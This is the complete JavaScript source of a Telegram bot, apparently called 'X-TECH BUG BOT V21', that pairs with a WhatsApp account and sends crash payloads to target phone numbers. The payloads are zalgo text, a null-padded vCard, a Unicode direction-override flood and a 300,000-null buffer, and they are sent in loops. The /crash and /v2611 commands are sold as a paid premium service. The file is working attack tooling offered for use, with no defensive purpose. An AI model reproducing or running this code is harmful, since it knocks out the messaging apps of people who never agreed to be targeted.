const { Telegraf } = require("telegraf");
const fs = require('fs');
const path = require('path');
const {
    makeWASocket,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    Browsers,
    makeCacheableSignalKeyStore,
    makeInMemoryStore
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN, OWNER_ID } = require("./config");

// --- 1. INITIALIZATION ---
const bot = new Telegraf(BOT_TOKEN);
const sessions = new Map(); 
const USERS_PREMIUM_FILE = 'usersPremium.json';
const SESSIONS_DIR = './sessions';

if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });

// --- 2. PREMIUM SYSTEM ---
let usersPremium = fs.existsSync(USERS_PREMIUM_FILE) ? JSON.parse(fs.readFileSync(USERS_PREMIUM_FILE)) : {};

const savePremiumData = () => {
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium, null, 2));
};

const isPremium = (userId) => {
    if (userId.toString() === OWNER_ID.toString()) return true;
    return usersPremium[userId] && usersPremium[userId].premiumUntil > Date.now();
};

// --- 3. HELPERS ---
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const getGreeting = () => {
    const hours = new Date().getHours();
    if (hours < 12) return "夜明け 🌅 (Dawn)";
    if (hours < 18) return "午後 🌇 (Afternoon)";
    return "夜 🌌 (Evening)";
};

const getActiveSock = () => {
    for (const sock of sessions.values()) if (sock) return sock;
    return null;
};

const QBug = { 
    key: { remoteJid: "p", fromMe: false, participant: "0@s.whatsapp.net" }, 
    message: { conversation: "X-TECH SYSTEM OVERLOAD V21" } 
};

// --- 4. ADVANCED BUG PAYLOADS ---
const BugList = {
    zalgo: async (sock, t) => {
        const combined = "X-TECH".split('').map(char => char + '\u0345'.repeat(500)).join('');
        await sock.sendMessage(t, { text: combined }, { quoted: QBug });
    },
    vcard: async (sock, t) => {
        const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:X-TECH BUG\nORG:CRASH;${"\u0000".repeat(30000)}\nEND:VCARD`;
        await sock.sendMessage(t, { contacts: { displayName: '⚠️ System Error', contacts: [{ vcard }] } }, { quoted: QBug });
    },
    ui: async (sock, t) => {
        await sock.sendMessage(t, { text: ("\u202E\u202D\u0000").repeat(10000) }, { quoted: QBug });
    },
    buffer: async (sock, t) => {
        await sock.sendMessage(t, { text: "\u0000".repeat(300000) }, { quoted: QBug });
    }
};

// --- 5. CONNECTION MANAGER ---
const startWA = async (num) => {
    const sessionDir = path.join(SESSIONS_DIR, num);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        logger: pino({ level: "silent" }),
        browser: ["Mac OS", "Chrome", "10.15.7"],
        syncFullHistory: false,
        shouldSyncHistoryMessage: () => false
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            sessions.set(num, sock);
            console.log(chalk.green(`✅ WhatsApp Linked: ${num}`));
        }
        if (connection === 'close') {
            const reason = lastDisconnect?.error?.output?.statusCode;
            if (reason !== DisconnectReason.loggedOut) {
                console.log(chalk.yellow(`Retrying connection for ${num}...`));
                startWA(num);
            } else {
                sessions.delete(num);
                console.log(chalk.red(`Session logged out for ${num}`));
            }
        }
    });

    return sock;
};

// --- 6. EXECUTION ENGINE ---
const executeSequence = async (ctx, target, list, loops) => {
    const sock = getActiveSock();
    if (!sock) return ctx.reply("❌ No active WhatsApp session. Use /pair first.");

    ctx.reply(`🚀 *Sequence Started*\n🎯 Target: \`${target}\``, { parse_mode: 'Markdown' });

    for (let i = 0; i < loops; i++) {
        for (const bug of list) {
            try { 
                await bug(sock, target); 
                await sleep(1500); // Protection against Railway rate-limiting
            } catch (e) { console.error("Send Error:", e.message); }
        }
    }
    ctx.reply("✅ *Payloads Delivered.*", { parse_mode: 'Markdown' });
};

// --- 7. TELEGRAM COMMANDS ---

bot.command('pair', async (ctx) => {
    const num = ctx.message.text.split(' ')[1]?.replace(/[^0-9]/g, '');
    if (!num) return ctx.reply("Usage: /pair 263xxxx");
    
    ctx.reply("⏳ Warming up connection engine...");
    try {
        const sock = await startWA(num);
        await sleep(5000); // Wait for initialization
        
        if (!sock.authState.creds.registered) {
            const code = await sock.requestPairingCode(num);
            const formatted = code?.match(/.{1,4}/g)?.join("-") || code;
            ctx.reply(`🔑 *Pairing Code:* \`${formatted}\`\n\nEnter this in WhatsApp Linked Devices.`, { 
                parse_mode: 'Markdown' 
            });
        } else {
            ctx.reply("✅ This number is already connected.");
        }
    } catch (err) {
        ctx.reply("❌ Pairing failed. Ensure the number is correct and try again.");
    }
});

// Bug Commands
bot.command('crash', async (ctx) => {
    if (!isPremium(ctx.from.id)) return ctx.reply("❌ Premium Only.");
    const num = ctx.message.text.split(' ')[1]?.replace(/[^0-9]/g, '');
    if (!num) return ctx.reply("Usage: /crash 263xxxx");
    
    const target = `${num}@s.whatsapp.net`;
    await executeSequence(ctx, target, [BugList.zalgo, BugList.vcard, BugList.ui], 2);
});

bot.command('v2611', async (ctx) => {
    if (!isPremium(ctx.from.id)) return ctx.reply("❌ Premium Only.");
    const num = ctx.message.text.split(' ')[1]?.replace(/[^0-9]/g, '');
    if (!num) return ctx.reply("Usage: /v2611 263xxxx");

    const target = `${num}@s.whatsapp.net`;
    await executeSequence(ctx, target, [BugList.buffer], 5);
});

// Admin Commands
bot.command('addprem', (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) return;
    const args = ctx.message.text.split(' ');
    if (args.length < 3) return ctx.reply("Usage: /addprem [user_id] [days]");
    
    const targetId = args[1];
    const days = parseInt(args[2]);
    
    usersPremium[targetId] = { premiumUntil: Date.now() + (days * 24 * 60 * 60 * 1000) };
    savePremiumData();
    ctx.reply(`✅ User ${targetId} is now Premium for ${days} days.`);
});

bot.command(['start', 'menu'], (ctx) => {
    const msg = `👋 *X-TECH BUG BOT V21*\nSelamat ${getGreeting()}!\n\n` +
                `*ADVANCED ATTACKS*\n` +
                `🔹 /crash [num] - (Triple Combo)\n` +
                `🔹 /v2611 [num] - (Legacy Buffer)\n\n` +
                `*SYSTEM*\n` +
                `🔹 /pair [num] - Link WhatsApp\n` +
                `🔹 /status - Check Connection\n` +
                `🔹 /addprem [id] [days]`;
                
    ctx.replyWithPhoto("https://files.catbox.moe/mzr41r.jpg", { 
        caption: msg, 
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[{ text: "Support Owner", url: "https://t.me/xtechcorporation2" }]]
        }
    });
});

bot.command('status', (ctx) => {
    const active = sessions.size;
    ctx.reply(`📊 *System Status*\n\nWhatsApp Connected: ${active > 0 ? '✅' : '❌'}\nActive Sessions: ${active}`, { parse_mode: 'Markdown' });
});

// --- 8. RUNTIME ---
bot.launch().then(() => console.log(chalk.blue("X-TECH V21 is Live and Ready")));

// Cleanup expired premium every hour
setInterval(() => {
    const now = Date.now();
    let changed = false;
    for (const id in usersPremium) {
        if (usersPremium[id].premiumUntil < now) {
            delete usersPremium[id];
            changed = true;
        }
    }
    if (changed) savePremiumData();
}, 3600000);
